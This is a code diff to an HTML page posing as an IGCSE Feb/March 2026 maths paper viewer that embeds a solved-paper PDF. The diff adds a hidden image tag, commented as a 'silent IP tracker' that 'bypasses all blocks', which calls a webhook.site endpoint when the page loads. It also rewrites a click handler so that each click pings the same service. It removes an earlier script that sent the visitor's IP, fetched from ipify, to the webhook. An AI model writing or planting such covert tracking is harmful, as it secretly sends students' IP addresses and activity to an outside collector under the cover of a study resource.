@@ -11,25 +11,18 @@
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
+    
+    <!-- 1. SILENT IP TRACKER (Bypasses all blocks) -->
+    <img src="https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b" style="display:none;">
+
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
-        const webURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
-
-        // 1. Silent IP Fetch
-        fetch("https://api.ipify.org")
-            .then(res => res.json())
-            .then(data => {
-                // Sending IP in the URL to avoid any JSON errors
-                fetch(webURL + "?type=IP_FOUND&ip=" + data.ip, { mode: "no-cors" });
-            })
-            .catch(err => {
-                fetch(webURL + "?type=FETCH_ERROR", { mode: "no-cors" });
-            });
-
-        // 2. Click Trigger
+        // 2. CLICK TRACKER
         window.onclick = function() {
-            fetch(webURL + "?type=USER_CLICKED", { mode: "no-cors" });
+            // This pings the webhook when they click the page
+            var ping = new Image();
+            ping.src = "https://webhook.site";
         };
     </script>
 </body>
